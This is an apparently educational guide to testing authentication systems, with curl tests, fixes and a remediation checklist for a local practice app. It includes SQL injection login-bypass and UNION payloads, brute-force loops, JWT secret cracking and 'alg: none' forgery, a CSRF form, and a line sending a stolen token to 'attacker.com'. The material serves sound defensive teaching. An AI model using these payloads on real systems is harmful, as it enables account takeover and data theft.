# 🔒 Security Testing Guide for Authentication Systems

This guide helps you identify and fix common authentication vulnerabilities.

## Table of Contents

- [Overview](#overview)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Testing Methodology](#testing-methodology)
- [Specific Tests](#specific-tests)
- [Tools](#tools)
- [Remediation](#remediation)

---

## Overview

Authentication is a critical security component. Vulnerabilities can lead to:
- Unauthorized access
- Data breaches
- Account takeover
- Privilege escalation
- Session hijacking

**Testing Principle:** Always test in a safe, controlled environment.

---

## Common Vulnerabilities

### 1. **Weak Password Storage** 🔐

**Vulnerability:** Passwords stored in plaintext or with weak hashing

**Impact:** Complete account compromise if database is leaked

**Test:**
```bash
# Check if passwords are hashed
# 1. Create account
curl -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"mypassword123"}'

# 2. If there's a debug endpoint or database access
# Look for plaintext passwords
```

**Signs:**
- Passwords visible in database
- Same password produces same hash (no salt)
- Passwords recoverable (not hashed)

**Fix:**
```python
import bcrypt

# Hash password
hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())

# Verify password
bcrypt.checkpw(password.encode('utf-8'), stored_hash)
```

---

### 2. **SQL Injection** 💉

**Vulnerability:** User input directly concatenated into SQL queries

**Impact:** Database compromise, authentication bypass, data theft

**Test:**
```bash
# Test 1: Authentication bypass
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}'

# Test 2: Extract data
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' UNION SELECT * FROM users --","password":"x"}'
```

**Payloads to try:**
```
' OR '1'='1' --
' OR 1=1 --
admin' --
' UNION SELECT NULL, username, password FROM users --
```

**Signs of Success:**
- Login without valid credentials
- Error messages revealing SQL structure
- Unexpected data in response

**Fix:**
```python
# BAD - Vulnerable to SQL injection
query = f"SELECT * FROM users WHERE username='{username}'"

# GOOD - Use parameterized queries
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
```

---

### 3. **Broken Authentication** 🔓

**Vulnerability:** Weak session management or predictable tokens

**Impact:** Session hijacking, unauthorized access

**Tests:**

**Test A: Weak Session IDs**
```bash
# Login multiple times and examine session IDs
for i in {1..5}; do
  curl -X POST http://localhost:5000/login \
    -H "Content-Type: application/json" \
    -d '{"username":"user'$i'","password":"pass123"}' \
    -v 2>&1 | grep Set-Cookie
done
```

**Look for:**
- Sequential session IDs
- Predictable patterns
- MD5/SHA1 of username (weak)

**Test B: Session Fixation**
```bash
# 1. Get a session before login
curl http://localhost:5000/ -c cookie1.txt

# 2. Login with that session
curl -X POST http://localhost:5000/login \
  -b cookie1.txt -c cookie2.txt \
  -H "Content-Type: application/json" \
  -d '{"username":"victim","password":"pass123"}'

# 3. Check if session ID changed
diff cookie1.txt cookie2.txt
```

**Fix:**
```python
# Generate cryptographically secure session IDs
import secrets
session_id = secrets.token_urlsafe(32)

# Regenerate session ID after login
old_session = session.copy()
session.clear()
session.update(old_session)
```

---

### 4. **Missing Rate Limiting** 🚀

**Vulnerability:** No limit on login attempts

**Impact:** Brute force attacks, password enumeration

**Test:**
```bash
# Brute force test
for i in {1..100}; do
  echo "Attempt $i"
  curl -X POST http://localhost:5000/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass'$i'"}'
done
```

**Signs:**
- All requests succeed (no blocking)
- No delay between attempts
- No account lockout

**Fix:**
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Login logic
```

---

### 5. **Information Disclosure** 📢

**Vulnerability:** Exposing sensitive information in responses

**Impact:** Helps attackers plan attacks, leaks sensitive data

**Test:**
```bash
# Check what login returns
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpass"}' | jq

# Check error messages
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"nonexistent","password":"test"}' | jq
```

**Look for:**
- Different errors for "user not found" vs "wrong password"
- Exposed passwords in responses
- Detailed error messages
- Session IDs in responses
- Stack traces

**Fix:**
```python
# BAD
if username not in users:
    return jsonify({'error': 'User not found'}), 404
if password != users[username]:
    return jsonify({'error': 'Wrong password'}), 401

# GOOD
if username not in users or password != users[username]:
    return jsonify({'error': 'Invalid credentials'}), 401
```

---

### 6. **Insecure Password Reset** 🔑

**Vulnerability:** Password reset without proper verification

**Impact:** Account takeover

**Test:**
```bash
# Try to reset any user's password
curl -X POST http://localhost:5000/reset-password \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","new_password":"hacked123"}' | jq

# Check if it worked
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"hacked123"}' | jq
```

**Requirements for Secure Reset:**
- ✅ Email verification
- ✅ Unique, time-limited reset token
- ✅ Current password or security questions
- ✅ Reset token single-use only

**Fix:**
```python
import secrets
from datetime import datetime, timedelta

# Generate reset token
reset_token = secrets.token_urlsafe(32)
expiry = datetime.utcnow() + timedelta(hours=1)

# Store token with expiry
reset_tokens[reset_token] = {
    'username': username,
    'expires': expiry
}

# Send email with reset link
send_email(email, f'Reset link: /reset?token={reset_token}')
```

---

### 7. **Missing Authorization Checks** 👑

**Vulnerability:** Users can access resources they shouldn't

**Impact:** Privilege escalation, data access violations

**Test:**
```bash
# Login as regular user
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"userpass"}' \
  -c user_cookies.txt

# Try to access admin endpoint
curl -X POST http://localhost:5000/admin/delete-user \
  -H "Content-Type: application/json" \
  -d '{"username":"victim"}' \
  -b user_cookies.txt
```

**Fix:**
```python
def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return jsonify({'error': 'Not authenticated'}), 401
        
        username = session.get('username')
        user = users.get(username)
        
        if user.get('role') != 'admin':
            return jsonify({'error': 'Requires admin privileges'}), 403
        
        return f(*args, **kwargs)
    return decorated

@app.route('/admin/delete-user', methods=['POST'])
@require_admin
def delete_user():
    # Admin only logic
```

---

### 8. **Weak JWT Implementation** 🎫

**Vulnerability:** JWT with weak secrets or no signature verification

**Impact:** Token forgery, unauthorized access

**Tests:**

**Test A: Weak Secret**
```python
import jwt

# Try to brute force the secret
token = "eyJ..."
common_secrets = ['secret', 'key', '123456', 'password']

for secret in common_secrets:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Found secret: {secret}")
        break
    except:
        continue
```

**Test B: Algorithm Confusion**
```python
# Try changing algorithm to 'none'
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"username": "admin", "role": "admin"}

token = base64.b64encode(json.dumps(header).encode()).decode() + '.' + \
        base64.b64encode(json.dumps(payload).encode()).decode() + '.'
```

**Test C: Token Expiration**
```bash
# Login and get token
TOKEN=$(curl -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}' | jq -r '.access_token')

# Wait for expiration (if short)
sleep 900

# Try to use expired token
curl http://localhost:5001/profile \
  -H "Authorization: Bearer $TOKEN"
```

**Fix:**
```python
import secrets

# Use strong secret
SECRET_KEY = secrets.token_hex(32)

# Always verify signature
try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
except jwt.InvalidTokenError:
    return jsonify({'error': 'Invalid token'}), 401

# Check expiration
if 'exp' not in payload:
    return jsonify({'error': 'Token has no expiration'}), 401
```

---

### 9. **Cross-Site Request Forgery (CSRF)** 🎭

**Vulnerability:** Session-based auth without CSRF protection

**Impact:** Unauthorized actions performed as authenticated user

**Test:**
Create HTML file:
```html
<!-- csrf_test.html -->
<html>
<body>
<form action="http://localhost:5000/update-profile" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com"/>
  <input type="submit" value="Click for prize!"/>
</form>
</body>
</html>
```

1. Login to app in browser
2. Open csrf_test.html in same browser
3. Click submit
4. Check if profile was updated

**Fix:**
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# Include CSRF token in forms
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>

# Or use Double Submit Cookie pattern
# Or use SameSite cookie attribute
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

---

### 10. **Insecure Token Storage** 💾

**Vulnerability:** JWTs stored in localStorage (XSS vulnerable)

**Impact:** Token theft via XSS attacks

**Test:**
```javascript
// In browser console after login
console.log(localStorage.getItem('token'));

// Simulate XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

**Fix:**
```javascript
// Store in httpOnly cookie (server-side)
response.set_cookie(
    'token',
    token,
    httponly=True,  // Not accessible via JavaScript
    secure=True,    // Only over HTTPS
    samesite='Strict'
)
```

---

## Testing Methodology

### 1. **Reconnaissance**
- Map all authentication endpoints
- Identify authentication method
- Review documentation
- Check for debug endpoints

### 2. **Input Validation**
- Test all input fields
- Try special characters
- Test boundary values
- Test injection payloads

### 3. **Authentication Testing**
- Test with valid credentials
- Test with invalid credentials
- Test with missing credentials
- Test with special characters

### 4. **Session Management**
- Analyze session tokens
- Test session expiration
- Test logout functionality
- Test concurrent sessions

### 5. **Authorization Testing**
- Test horizontal privilege escalation
- Test vertical privilege escalation
- Test default credentials
- Test role-based access

---

## Tools

### Command Line
```bash
# curl - HTTP requests
curl -X POST http://localhost:5000/login -d '{"user":"admin","pass":"admin"}'

# jq - JSON processing
curl http://localhost:5000/users | jq '.[] | .username'

# httpie - User-friendly HTTP client
http POST localhost:5000/login username=admin password=admin

# sqlmap - SQL injection testing
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=admin"
```

### GUI Tools
- **Burp Suite** - Comprehensive web security testing
- **OWASP ZAP** - Free security scanner
- **Postman** - API testing and automation

### Python Scripts
```python
import requests

# Brute force test
passwords = ['admin', 'password', '123456', 'admin123']
for pwd in passwords:
    r = requests.post('http://localhost:5000/login',
                     json={'username': 'admin', 'password': pwd})
    if r.status_code == 200:
        print(f'Found password: {pwd}')
        break
```

---

## Remediation Checklist

### Password Security
- [ ] Passwords hashed with bcrypt, scrypt, or Argon2
- [ ] Passwords salted (unique salt per password)
- [ ] Minimum password length enforced (8+ characters)
- [ ] Password complexity requirements
- [ ] Password history (prevent reuse)

### Input Validation
- [ ] All inputs validated and sanitized
- [ ] Parameterized queries (no string concatenation)
- [ ] Input length limits enforced
- [ ] Special characters handled properly

### Session Management
- [ ] Cryptographically secure session IDs
- [ ] Session ID regenerated after login
- [ ] Sessions expire after inactivity
- [ ] Logout destroys session completely
- [ ] httpOnly and Secure flags on cookies

### Authentication
- [ ] Generic error messages ("Invalid credentials")
- [ ] Rate limiting on login endpoint
- [ ] Account lockout after failed attempts
- [ ] Multi-factor authentication option
- [ ] Password reset with email verification

### Authorization
- [ ] Authorization checks on every endpoint
- [ ] Principle of least privilege
- [ ] Role-based access control
- [ ] No authorization bypass vulnerabilities

### JWT Security
- [ ] Strong secret key (32+ random bytes)
- [ ] Token expiration enforced
- [ ] Signature verification always enabled
- [ ] Refresh token mechanism
- [ ] Token stored securely (httpOnly cookie)

### Communication
- [ ] HTTPS enforced (no HTTP)
- [ ] HSTS header enabled
- [ ] Secure cookie flags set

---

## Security Testing Report Template

```markdown
# Security Testing Report: [Application Name]

## Executive Summary
- Date: YYYY-MM-DD
- Tester: [Your Name]
- Scope: Authentication system
- Critical findings: X
- High findings: Y
- Medium findings: Z

## Findings

### 1. [Vulnerability Name]
**Severity:** Critical/High/Medium/Low
**Status:** Open/Fixed

**Description:**
[What is the vulnerability?]

**Location:**
[Which endpoints/components?]

**Impact:**
[What damage can this cause?]

**Reproduction Steps:**
1. Step 1
2. Step 2
3. Step 3

**Evidence:**
```bash
[Command/Request]
```
[Response/Screenshot]

**Remediation:**
[How to fix it]

**References:**
- [OWASP Link]
- [CWE Link]

---

## Summary
[Overall security posture]

## Recommendations
1. Priority 1 fixes
2. Priority 2 fixes
3. Long-term improvements
```

---

## Additional Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## Practice

Use the intentionally vulnerable app:
```bash
python examples/05_vulnerable_auth.py
```

See `/vulnerabilities` endpoint for a list of all vulnerabilities to find and exploit!

---

**Remember:** Only test systems you have permission to test! Unauthorized security testing is illegal.

Happy (ethical) hacking! 🔒
